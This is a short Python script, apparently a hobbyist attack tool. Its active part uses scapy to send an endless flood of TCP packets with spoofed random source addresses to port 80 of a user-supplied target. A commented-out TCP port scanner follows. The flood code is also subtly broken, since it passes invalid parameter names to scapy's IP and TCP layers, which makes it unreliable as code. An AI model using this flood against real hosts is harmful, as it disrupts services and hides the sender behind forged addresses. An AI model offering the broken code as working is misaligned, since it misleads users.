import random
from scapy.all import *
from scapy.layers.inet import *
target_IP = input("Enter IP address of Target: ")
i = 1

while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = "."
   Source_ip = a + dot + b + dot + c + dot + d
   
   for source_port in range(1, 65535):
      IP1s = IP(ource_IP = Source_ip, destination = target_IP)
      TCP1s = TCP(srcport = source_port, dstport = 80)
      pkt = IP1s / TCP1s
      send(pkt,inter = .001)
      print ("packet sent ", i)
      i = i + 1
# from socket import *
# import time
# startTime = time.time()

# if __name__ == '__main__':
#    target = input('Enter the host to be scanned: ')
#    t_IP = gethostbyname(target)

#    print ('Starting scan on host: ', t_IP)
   
#    for i in range(50, 500):
#       s = socket(AF_INET, SOCK_STREAM)
      
#       conn = s.connect_ex((t_IP, i))
#       if(conn == 0) :
#          print ('Port %d: OPEN' % (i,))
#       s.close()
# print('Time taken:', time.time() - startTime)